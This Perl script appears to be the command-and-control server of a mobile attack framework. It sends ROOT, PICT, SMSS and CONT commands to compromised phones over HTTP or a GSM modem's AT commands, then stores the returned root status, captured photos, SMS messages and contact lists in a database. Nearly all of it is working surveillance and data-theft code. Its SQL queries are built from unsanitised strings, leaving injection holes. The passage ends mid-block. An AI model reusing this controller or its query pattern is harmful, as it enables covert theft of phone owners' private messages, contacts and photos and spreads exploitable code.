#!/usr/bin/perl
use DBI;
use Cwd;
use Expect;
use IO::Socket;
use Device::SerialPort;
$configfile = "config";
 open(CONFIG, "+<$configfile");
while (<CONFIG>)
{
        chomp;
        s/#.*//;
        s/^\s+//;
        s/\s+$//;
        ($var, $value) = split(/\s*=\s*/, $_, 2);
        $Variables{$var} = ${value};
}
$Variables{"OS"} = $^O;
$ipaddress = $Variables{"IPADDRESS"};
$webserver = $Variables{"WEBSERVER"};
$path = $ARGV[0];
$key = $ARGV[1];
$id = $ARGV[2];
$sqlserver = $Variables{"MYSQLSERVER"};
while(1)
	{
	$fullpath5 = $webserver . $path . "/putfunc";
        open(PUTFILE, "+<$fullpath5");
        $line= <PUTFILE>;
	close(PUTFILE);
	open(PUTFILE2, ">$fullpath5");
	print PUTFILE2;
	close(PUTFILE2);
	$catcommand = "cat " . $fullpath5 . " | sed '1d' > hold";
	system($catcommand);
	$catcommand2 = "mv hold " . $fullpath;
	system($catcommand);
	@split = split(/ /, $line);
	if (@split[0] eq $key)
	{
		if (@split[1] eq "ROOT")
		{
			$delivery = @split[2];
			chomp($delivery);
			$command = $key . " " . "ROOT"; 
                	if ($delivery eq "HTTP")
                	{
				#print "HTTP\n";
                        	$control = $webserver . $path . "/control";
                        	open(CONTROLFILE, ">$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                        	sleep 60;
                       		$text = $webserver . $path . "/text.txt";
                       		open(TEXTFILE, "+<$text");
                       		$line= <TEXTFILE>;
                               		$table = "data";
					$username = $Variables{"MYSQLUSER"};
                                	$password = $Variables{"MYSQLPASS"};
                                	$port = $Variables{"MYSQLPORT"};
                                	$type = $Variables{"DATABASETYPE"}; 
					if ($type eq "postgres")
                			{
                        			$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
					}
  					elsif ($type eq "mysql")
                			{     
			  			$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                			}
                               		$yes = $line;
                               		$insertquery = "UPDATE $table SET root=" . "'" . $line . "'" . " WHERE id=" . "'" . $id . "'";
                               		$sql = $dbh->prepare($insertquery);
 			       		$sql->execute;
                       		close(TEXTFILE);
                       		open(TEXTFILE2, ">$text");
                       		print TEXTFILE2 "";
                       		close(TEXTFILE2);
			}
			if ($delivery eq "SMS")
                	{
				#print "SMS\n";
                       		$modem = @split[3];
				chomp($modem);
				$username = $Variables{"MYSQLUSER"};
                                $password = $Variables{"MYSQLPASS"};
                                $port = $Variables{"MYSQLPORT"};
                                $type = $Variables{"DATABASETYPE"};
				if ($type eq "postgres")
                		{
                        		$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
				}
  				elsif ($type eq "mysql")
                		{     
			  		$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                		}
                       		$pathquery = "SELECT path from modems where id=" . $modem;
                       		$sql = $dbh->prepare($pathquery);
                        	$results = $sql->execute;
                        	@rows = $sql->fetchrow_array();
                        	$path2 = @rows[0];
                        	$keyquery = "SELECT controlkey from modems where id=" . $modem;
                        	$sql = $dbh->prepare($keyquery);
                        	$results2 = $sql->execute;
                        	@rows = $sql->fetchrow_array();
                        	$key2 = @rows[0];
                        	$numberquery = "SELECT number from agents where id=" . $id;
                        	$sql = $dbh->prepare($numberquery);
                        	$results = $sql->execute;
                        	@rows = $sql->fetchrow_array();
                        	$number2 = @rows[0];
			$modemtypequery = "SELECT type from modems where id=" . $modem;
				$sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
				if ($modemtype2 eq "usb")
				{
					$usb = Device::SerialPort->new("/dev/ttyUSB2");
	                                $usb->databits(8);
                                	$usb->baudrate(115200);
                                	$usb->parity("none");
                                	$usb->stopbits(1);
                                	$usb->write("ATZ\r\n");
                                	sleep(1);
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
                                	$usb->write("AT+CMGF=1\r\n");
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
					$numberline = "AT+CMGS=\"" . $number2 . "\"\r\n";
                                	$usb->write($numberline);
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);	
					$usb->write($command.pack('c',26));
                                	sleep(10);
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
                                	$usb->close();

				}
				elsif ($modemtype2 eq "app") 
				{
                        		$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
		        		$control = $webserver . $path2 . "/getfunc";
                        		open(CONTROLFILE, ">$control");
                        		print CONTROLFILE $command2;
                        		close(CONTROLFILE);
				}
                        	sleep 60;
                        	$text = $webserver . $path . "/text.txt";
                        	open(TEXTFILE, "+<$text");
                        	$line= <TEXTFILE>;
				chomp($line);
				#print $line;
					#print "MATCH\n";
                               		$table = "data";
                               	 	$yes = "$line";
                                	$insertquery = "UPDATE $table SET root=" . "'" . $yes . "'" . " WHERE id=" . "'" . $id . "'";
                                	$sql = $dbh->prepare($insertquery);
                                	$sql->execute;
                         	
                        	close(TEXTFILE);
                        	open(TEXTFILE2, ">$text");
				print TEXTFILE2 "";
                        	close(TEXTFILE2);

			}

		
		}
		elsif (@split[1] eq "PICT")
		{
			print "PICT\n";
			$delivery = @split[2];
			chomp($delivery);
			$command = $key . " " . "PICT"; 
                	if ($delivery eq "HTTP")
                	{
                        	$control = $webserver . $path . "/control";
                        	open(CONTROLFILE, ">$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                        	sleep 30;
                        	$picturefile = $webserver . $path . "/picture.jpg";
                        	open(PICTURE, "+<$picturefile");
                        	if (!(-z PICTURE))
                        	{
                                	$command = "cp" . " " . $picturefile . " " . ".";                               
                                	system($command);
                                	$picturedir = getcwd();
                                	$table = "data";
                                	$picture = $picturedir . "/" . "picture.jpg";
                                	$sqlserver = $Variables{"MYSQLSERVER"};
                                	$username = $Variables{"MYSQLUSER"};
                                	$password = $Variables{"MYSQLPASS"};
                                	$port = $Variables{"MYSQLPORT"};
					 $type = $Variables{"DATABASETYPE"}; 
					if ($type eq "postgres")
                			{
                        			$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
					}
  					elsif ($type eq "mysql")
                			{     
			  			$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                			}
                                	$insertquery = "UPDATE $table SET picture=" . "'" . $picture . "'" . " WHERE id=" . "'" . $id . "'";
                                	$sql = $dbh->prepare($insertquery);
                                	$sql->execute;
                                	close(PICTURE);
                                	open(PICTURE2, ">$picturefile");
                                	print PICTURE2 "";
                                	close(PICTURE2);
                        	}       
                      
                	}
                	if ($delivery eq "SMS")
                	{
				print "SMS\n";
                        	$modem = @split[3];
				chomp($modem);
				 $sqlserver = $Variables{"MYSQLSERVER"};
                                $username = $Variables{"MYSQLUSER"};
                                $password = $Variables{"MYSQLPASS"};
                                $port = $Variables{"MYSQLPORT"};
                              	$type = $Variables{"DATABASETYPE"}; 
				if ($type eq "postgres")
                		{
                        		$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
				}
  				elsif ($type  eq "mysql")
                		{     
			  		$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                		}
                                $pathquery = "SELECT path from modems where id=" . $modem;
                                $sql = $dbh->prepare($pathquery);
                                $results = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $path2 = @rows[0];
                                $keyquery = "SELECT controlkey from modems where id=" . $modem;
                                $sql = $dbh->prepare($keyquery);
                                $results2 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $key2 = @rows[0];
                                 $numberquery = "SELECT number from agents where id=" . $id;
                                $sql = $dbh->prepare($numberquery);
                                $results = $sql->execute;
                                @rows = $sql->fetchrow_array();
				$number2 = @rows[0];
				$modemtypequery = "SELECT type from modems where id=" . $modem;
				$sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
				if ($modemtype2 eq "usb")
				{
					$usb = Device::SerialPort->new("/dev/ttyUSB2");
	                                $usb->databits(8);
                                	$usb->baudrate(115200);
                                	$usb->parity("none");
                                	$usb->stopbits(1);
                                	$usb->write("ATZ\r\n");
                                	sleep(1);
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
                                	$usb->write("AT+CMGF=1\r\n");
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
					$numberline = "AT+CMGS=\"" . $number2 . "\"\r\n";
                                	$usb->write($numberline);
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);	
					$usb->write($command.pack('c',26));
                                	sleep(2);
                                	$line = read_modem($usb);
                                	print $line;
                                	sleep(1);
                                	$usb->close();

				}
				elsif ($modemtype2 eq "app") 
				{
                                	$control = $webserver . $path2 . "/getfunc";
                                	open(CONTROLFILE, ">$control");
                                	$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
                                	print CONTROLFILE $command2;
                                	close(CONTROLFILE);
				}
                                sleep(60);
                                $picturefile = $webserver . $path . "/picture.jpg";
                                open(PICTURE, "+<$picturefile");
                                if (!(-z PICTURE))
                                {
                                        $command = "cp" . " " . $picturefile . " " . ".";                               
                                        system($command);
                                        $picturedir = getcwd();
                                        $table = "data";
                                        $picture = $picturedir . "/" . "picture.jpg";
                                        $insertquery = "UPDATE $table SET picture=" . "'" . $picture . "'" . " WHERE id=" . "'" . $id . "'";
                                        $sql = $dbh->prepare($insertquery);
					$sql->execute;
                                        close(PICTURE);
                                        open(PICTURE2, ">$picturefile");
                                        print PICTURE2 "";
                                        close(PICTURE2);
				}

			}
		}
		elsif (@split[1] eq "SMSS")
		{
			$deliverymethod = @split[2];
			$returnmethod = @split[3];
			chomp($returnmethod);
			 if ($returnmethod eq "SMS")
                	{
				$modem = @split[4];
				chomp($modem);	
				$sqlserver = $Variables{"MYSQLSERVER"};
                        	$username = $Variables{"MYSQLUSER"};
                        	$password = $Variables{"MYSQLPASS"};
                        	$port = $Variables{"MYSQLPORT"};
                        	 $type = $Variables{"DATABASETYPE"}; 
				if ($type eq "postgres")
                		{
                        		$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
				}
  				elsif ($type eq "mysql")
                		{     
			  		$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                		}
                        	$pathquery = "SELECT path from modems where id=" . $modem;
                        	$sql = $dbh->prepare($pathquery);
                        	$results = $sql->execute;
                        	@rows = $sql->fetchrow_array();
                        	$path2 = @rows[0];
                        	$command = $key . " " . "SMSS" . " " . $returnmethod; 
				if ($deliverymethod eq "HTTP")
                        	{
                                	$control = $webserver . $path . "/control";
                                	open(CONTROLFILE, ">$control");
                                	print CONTROLFILE $command;
                                	close(CONTROLFILE);
					 $modemtypequery = "SELECT type from modems where id=" . $modem;
					  $sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
                                if ($modemtype2 eq "usb")
                                {
                                        $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
                                        $usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
					$usb->write("AT+CMGF=1\r\n");
					sleep 1;            
					$line = read_modem($usb);
                                        print $line;
                                	sleep 60;
					 $line = read_modem($usb);
                                print $line1;
                                @values1 = split(//,$line);
                                $subber = substr($line, 2,6);
				print $subber;
                                
                                $get = "+CMTI:";
                                if ($subber  eq $get)
                                {
                			print "yes\n";
                                        @values2 = split(',',$line);
                                        $offset = @values2[1];
					print $offset;
                                        $usb->write("AT+CPMS=\"SM\"\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        $msg =  "AT+CMGR=" . $offset . "\r\n";
                                        $usb->write($msg);
                                        sleep(2);
                                        $line = read_modem($usb);
                                        print $line;
                                        @values3 = split('"',$line);
                                        $len = scalar @values3;
                                        shift(@values3);
                                        shift(@values3);
					    shift(@values3);
                                        shift(@values3);
                                        shift(@values3);
                                        shift(@values3);
                                        $firstring = join("", @values3);
                                        chomp($firstring);
                                        $len = length($firstring);
                                        print $len;
                                        print $firststring;
                                        $amount = $len - (2 + 7);
                                         $stringtwo = substr($firstring, 2, $amount);
                                        print $stringtwo;
                                        $usb->close();
                                          $table = "data";
                                        $username = $Variables{"MYSQLUSER"};
                                        $password = $Variables{"MYSQLPASS"};
                                        $port = $Variables{"MYSQLPORT"};
                                         $type = $Variables{"DATABASETYPE"}; 
                                        if ($type eq "postgres")
                                        {
                                                $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
  }
                                        elsif ($type eq "mysql")
                                        {     
                                                $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                                        }
                                        $insertquery = "UPDATE $table SET sms=" . "'" . $stringtwo . "'" . " WHERE id=" . "'" . $id . "'";
                                        $sql = $dbh->prepare($insertquery);
                                        $sql->execute;

                                        }


                                }
                                elsif ($modemtype2 eq "app") 
                                {
					sleep 60;

                                	$text = $webserver . $path2 . "/text.txt";
                                	open(TEXTFILE, "+<$text");
                                	$line= <TEXTFILE>;
                                	$table = "data";
                                	$insertquery = "UPDATE $table SET sms=" . "'" . $line . "'" . " WHERE id=" . "'" . $id . "'";
                                	$sql = $dbh->prepare($insertquery);
                                	$sql->execute;
                                	close(TEXTFILE);
                                	open(TEXTFILE2, ">$text");
                                	print TEXTFILE2 "";
                                	close(TEXTFILE2);
					}
				}
			 	if ($deliverymethod eq "SMS")
                         	{
					print "SMS";
                  			$keyquery = "SELECT controlkey from modems where id=" . $modem;
                                	$sql = $dbh->prepare($keyquery);
                                	$results2 = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$key2 = @rows[0];
                                 	$numberquery = "SELECT number from agents where id=" . $id;
                                	$sql = $dbh->prepare($numberquery);
                                	$results = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$number2 = @rows[0];
                                 	 $modemtypequery = "SELECT type from modems where id=" . $modem;
                                $sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
                                if ($modemtype2 eq "usb")
                                {
                                        $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
                                        $usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->write("AT+CMGF=1\r\n");
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
					 $numberline = "AT+CMGS=\"" . $number2 . "\"\r\n";
                                        $usb->write($numberline);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);       
                                        $usb->write($command.pack('c',26));
                                        sleep(10);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(60);
					 $line = read_modem($usb);
                                print $line;
                                @values1 = split(//,$line);
                                $subber = substr($line, 2,6);
                                print $subber; 
                                $get = "+CMTI:";
                                if ($subber  eq $get)
                                {
                
                                        @values2 = split(',',$line);
                                        $offset = @values2[1];
                                        $usb->write("AT+CPMS=\"SM\"\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        $msg =  "AT+CMGR=" . $offset . "\r\n";
                                        $usb->write($msg);
                                        sleep(2);
                                        $line = read_modem($usb);
                                        print $line;
                                        @values3 = split('"',$line);
                                        $len = scalar @values3;
                                        shift(@values3);
                                        shift(@values3);
					 shift(@values3);
                                        shift(@values3);
                                        shift(@values3);
                                        shift(@values3);
                                        $firstring = join("", @values3);
                                        chomp($firstring);
                                        $len = length($firstring);
					print $len;
					print $firststring;
					$amount = $len - (2 + 7);
                               		 $stringtwo = substr($firstring, 2, $amount);
					print $stringtwo;
					$usb->close();
					  $table = "data";
                                        $username = $Variables{"MYSQLUSER"};
                                        $password = $Variables{"MYSQLPASS"};
                                        $port = $Variables{"MYSQLPORT"};
                                         $type = $Variables{"DATABASETYPE"}; 
                                        if ($type eq "postgres")
                                        {
                                                $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
                                        }
                                        elsif ($type eq "mysql")
                                        {     
                                                $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                                        }
                                        $insertquery = "UPDATE $table SET sms=" . "'" . $stringtwo . "'" . " WHERE id=" . "'" . $id . "'";
                                        $sql = $dbh->prepare($insertquery);
                                        $sql->execute;

					}


                                }
                                elsif ($modemtype2 eq "app") 
                                {

					  $command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;

					$control = $webserver . $path2 . "/getfunc";
                                	open(CONTROLFILE, ">$control");
                                 	print CONTROLFILE $command2;
                                	close(CONTROLFILE);
                                        sleep 60;
                                	$text = $webserver . $path2 . "/text.txt";
                                	open(TEXTFILE, "+<$text");
                                	$line= <TEXTFILE>;
		                        $table = "data";
                                	$username = $Variables{"MYSQLUSER"};
                                	$password = $Variables{"MYSQLPASS"};
                                	$port = $Variables{"MYSQLPORT"};
                                	 $type = $Variables{"DATABASETYPE"}; 
					if ($type eq "postgres")
                			{
                        			$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
					}
  					elsif ($type eq "mysql")
                			{     
			  			$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                			}
                                	$insertquery = "UPDATE $table SET sms=" . "'" . $line . "'" . " WHERE id=" . "'" . $id . "'";
                                	$sql = $dbh->prepare($insertquery);
                                	$sql->execute;
                                	close(TEXTFILE);
                                	open(TEXTFILE2, ">$text");
                                	print TEXTFILE2 "";
                                	close(TEXTFILE2);
				}
			}
			}
			 if ($returnmethod eq "HTTP")
                	{
                        	$command = $key . " " . "SMSS" . " " . "WEB";
                        	if ($deliverymethod eq "HTTP")
                        	{
                                	$control = $webserver . $path . "/control";
                                	open(CONTROLFILE, ">$control");
                                	print CONTROLFILE $command;
                               	 	close(CONTROLFILE);
                                	sleep 30;
                                	$text = $webserver . $path . "/text.txt";
                                	open(TEXTFILE, "+<$text");
                                	$line= <TEXTFILE>;
                                	$table = "data";
                                	$username = $Variables{"MYSQLUSER"};
                                	$password = $Variables{"MYSQLPASS"};
                                	$port = $Variables{"MYSQLPORT"};
                                	 $type = $Variables{"DATABASETYPE"}; 
					if ($type eq "postgres")
                			{
                        			$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
					}
  					elsif ($type eq "mysql")
                			{     
			  			$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                			}
                                	$insertquery = "UPDATE $table SET sms=" . "'" . $line . "'" . " WHERE id=" . "'" . $id . "'";
                                	$sql = $dbh->prepare($insertquery);
					close(TEXTFILE);
                                	open(TEXTFILE2, ">$text");
                                	print TEXTFILE2 "";
                                	close(TEXTFILE2); 
	                               	$sql->execute;
  				}
                        	if ($deliverymethod eq "SMS")
                        	{
                              		$modem = @split[4];
					chomp($modem);
					 $type = $Variables{"DATABASETYPE"};
					if ($type eq "postgres")
                			{
                        			$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
					}
  					elsif ($type eq "mysql")
                			{     
			  			$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                			}
                         		$pathquery = "SELECT path from modems where id=" . $modem;
                                	$sql = $dbh->prepare($pathquery);
                                	$results = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$path2 = @rows[0];
                                	$keyquery = "SELECT controlkey from modems where id=" . $modem;
                                	$sql = $dbh->prepare($keyquery);
                                	$results2 = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$key2 = @rows[0];
                                 	$numberquery = "SELECT number from agents where id=" . $id;
                                	$sql = $dbh->prepare($numberquery);
                                	$results = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$number2 = @rows[0];
					$modemtypequery = "SELECT type from modems where id=" . $modem;
                                $sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
                                if ($modemtype2 eq "usb")
                                {
                                        $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
                                        $usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->write("AT+CMGF=1\r\n");
					sleep 1;
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
					  $numberline = "AT+CMGS=\"" . $number2 . "\"\r\n";
                                        $usb->write($numberline);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);       
                                        $usb->write($command.pack('c',26));
                                        sleep(10);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(60);
				}
					  elsif ($modemtype2 eq "app") 
                                {
					

                              		$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
                                 	$control = $webserver . $path2 . "/getfunc";
                                	open(CONTROLFILE, ">$control");
                                 	print CONTROLFILE $command2;
                                	close(CONTROLFILE);
					sleep 60;
					}
                                	$text = $webserver . $path . "/text.txt";
                                	open(TEXTFILE, "+<$text");
                                	$line= <TEXTFILE>;
                                	$table = "data";
                                	$insertquery = "UPDATE $table SET sms=" . "'" . $line . "'" . " WHERE id=" . "'" . $id . "'";
                                	$sql = $dbh->prepare($insertquery);
                                	$sql->execute;
                                	close(TEXTFILE);
                                	open(TEXTFILE2, ">$text");
                                	print TEXTFILE2 "";
                                	close(TEXTFILE2);
				}
			}	

		}
		elsif (@split[1] eq "CONT")
		{
			$deliverymethod = @split[2];
                        $returnmethod = @split[3];
			chomp($returnmethod);
			if ($returnmethod eq "SMS")
			{
				$modem = @split[4];
				chomp($modem);
				$sqlserver = $Variables{"MYSQLSERVER"};
                		$username = $Variables{"MYSQLUSER"};
                		$password = $Variables{"MYSQLPASS"};
                		$port = $Variables{"MYSQLPORT"};
                		 $type = $Variables{"DATABASETYPE"};
				if ($type eq "postgres")
                		{
                        		$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
				}
  				elsif ($type eq "mysql")
                		{     
			  		$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                		}
			 	$pathquery = "SELECT path from modems where id=" . $modem;
                        	$sql = $dbh->prepare($pathquery);
                        	 $results = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $path2 = @rows[0];
				$command = $key . " " . "CONT" . " " . $returnmethod; 
				if ($deliverymethod eq "HTTP")
				{
					$control = $webserver . $path . "/control";
					open(CONTROLFILE, ">$control");
       		        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
						 $modemtypequery = "SELECT type from modems where id=" . $modem;
					   $sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
                                if ($modemtype2 eq "usb")
                                {
                                        $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
                                        $usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
 					$usb->write("AT+CMGF=1\r\n");
					sleep 1;
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep 60;
                                         $line = read_modem($usb);
                                print $line;
                                @values1 = split(//,$line);
                                $subber = substr($line, 2,6);
                                print $subber; 
                                $get = "+CMTI:";
				 if ($subber  eq $get)
                                {
                
                                        @values2 = split(',',$line);
                                        $offset = @values2[1];
                                        $usb->write("AT+CPMS=\"SM\"\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        $msg =  "AT+CMGR=" . $offset . "\r\n";
                                        $usb->write($msg);
                                        sleep(2);
                                        $line = read_modem($usb);
                                        print $line;
                                        @values3 = split('"',$line);
                                        $len = scalar @values3;
                                        shift(@values3);
                                        shift(@values3);
                                            shift(@values3);
                                        shift(@values3);
                                        shift(@values3);
                                        shift(@values3);
                                        $firstring = join("", @values3);
                                        chomp($firstring);
					   $len = length($firstring);
                                        print $len;
                                        print $firststring;
                                        $amount = $len - (2 + 7);
                                         $stringtwo = substr($firstring, 2, $amount);
                                        print $stringtwo;
                                        $usb->close();
                                          $table = "data";
                                        $username = $Variables{"MYSQLUSER"};
                                        $password = $Variables{"MYSQLPASS"};
                                        $port = $Variables{"MYSQLPORT"};
                                         $type = $Variables{"DATABASETYPE"}; 
                                        if ($type eq "postgres")
                                        {
                                                $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
  }
                                        elsif ($type eq "mysql")
                                        {     
                                                $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                                        }
  $insertquery = "UPDATE $table SET contacts=" . "'" . $stringtwo . "'" . " WHERE id=" . "'" . $id . "'";
                                        $sql = $dbh->prepare($insertquery);
                                        $sql->execute;

                                        }


                                }
                                elsif ($modemtype2 eq "app") 
                                {

					sleep 60;
					$text = $webserver . $path2 . "/text.txt";
                                	open(TEXTFILE, "+<$text");
                                	$line= <TEXTFILE>;
					$table = "data";
					$insertquery = "UPDATE $table SET contacts=" . "'" . $line . "'" . " WHERE id=" . "'" . $id . "'";
					$sql = $dbh->prepare($insertquery);
					$sql->execute;
					close(TEXTFILE);
					open(TEXTFILE2, ">$text");
					print TEXTFILE2 "";
					close(TEXTFILE2);
					}
		
				}
				if ($deliverymethod eq "SMS")
				{
					$keyquery = "SELECT controlkey from modems where id=" . $modem;
                                	$sql = $dbh->prepare($keyquery);
                                	$results2 = $sql->execute;
                                	@rows = $sql->fetchrow_array();
                                	$key2 = @rows[0];
				 	$numberquery = "SELECT number from agents where id=" . $id;
                                	$sql = $dbh->prepare($numberquery);
                                	$results = $sql->execute;
                               		@rows = $sql->fetchrow_array();
                               		$number2 = @rows[0];
    $modemtypequery = "SELECT type from modems where id=" . $modem;
                                $sql = $dbh->prepare($modemtypequery);
                                $results3 = $sql->execute;
                                @rows = $sql->fetchrow_array();
                                $modemtype2 = @rows[0];
                                if ($modemtype2 eq "usb")
                                {
                                        $usb = Device::SerialPort->new("/dev/ttyUSB2");
                                        $usb->databits(8);
                                        $usb->baudrate(115200);
                                        $usb->parity("none");
                                        $usb->stopbits(1);
                                        $usb->write("ATZ\r\n");
                                        sleep(1);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
                                        $usb->write("AT+CMGF=1\r\n");
					sleep 1;
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);
     $numberline = "AT+CMGS=\"" . $number2 . "\"\r\n";
                                        $usb->write($numberline);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(1);       
                                        $usb->write($command.pack('c',26));
                                        sleep(10);
                                        $line = read_modem($usb);
                                        print $line;
                                        sleep(60);
                                         $line = read_modem($usb);
                                print $line;
                                @values1 = split(//,$line);
                                $subber = substr($line, 2,6);
                                print $subber; 
                                $get = "+CMTI:";
                                if ($subber  eq $get)
                                {
                
                                        @values2 = split(',',$line);
                                        $offset = @values2[1];
                                        $usb->write("AT+CPMS=\"SM\"\r\n");
  sleep(1);
                                        $line = read_modem($usb);
                                        $msg =  "AT+CMGR=" . $offset . "\r\n";
                                        $usb->write($msg);
                                        sleep(2);
                                        $line = read_modem($usb);
                                        print $line;
                                        @values3 = split('"',$line);
                                        $len = scalar @values3;
                                        shift(@values3);
                                        shift(@values3);
                                         shift(@values3);
                                        shift(@values3);
                                        shift(@values3);
                                        shift(@values3);
                                        $firstring = join("", @values3);
                                        chomp($firstring);
                                        $len = length($firstring);
                                        print $len;
                                        print $firststring;
                                        $amount = $len - (2 + 7);
                                         $stringtwo = substr($firstring, 2, $amount);
 print $stringtwo;
                                        $usb->close();
                                          $table = "data";
                                        $username = $Variables{"MYSQLUSER"};
                                        $password = $Variables{"MYSQLPASS"};
                                        $port = $Variables{"MYSQLPORT"};
                                         $type = $Variables{"DATABASETYPE"}; 
                                        if ($type eq "postgres")
                                        {
                                                $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
                                        }
                                        elsif ($type eq "mysql")
                                        {     
                                                $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                                        }
                                        $insertquery = "UPDATE $table SET contacts=" . "'" . $stringtwo . "'" . " WHERE id=" . "'" . $id . "'";
                                        $sql = $dbh->prepare($insertquery);
                                        $sql->execute;

                                        }
  }
                                elsif ($modemtype2 eq "app") 
                                {

					$command2 = $key2 . " " . "SEND" . " " . $number2 . " " . $command;
			 		$control = $webserver . $path2 . "/getfunc";
                       			open(CONTROLFILE, ">$control");
			 		print CONTROLFILE $command2;
                        		close(CONTROLFILE);
					sleep 60;
					$text = $webserver . $path2 . "/text.txt";
                                	open(TEXTFILE, "+<$text");
					$line= <TEXTFILE>;
					$table = "data";
					$insertquery = "UPDATE $table SET contacts=" . "'" . $line . "'" . " WHERE id=" . "'" . $id . "'";
					$sql = $dbh->prepare($insertquery);
					$sql->execute;
					close(TEXTFILE);
					open(TEXTFILE2, ">$text");
					print TEXTFILE2 "";
